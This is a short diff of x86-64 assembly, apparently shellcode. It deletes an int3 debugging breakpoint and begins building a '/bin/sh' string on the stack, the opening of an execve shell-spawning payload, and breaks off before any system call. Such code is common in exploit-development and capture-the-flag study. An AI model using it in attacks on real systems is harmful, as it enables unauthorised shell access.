@@ -3,7 +3,6 @@ BITS 64
 section .text
 global _start
 _start:
-	int3
 	mov rax, "/bin/sh"
 	push rax
 	push rsp
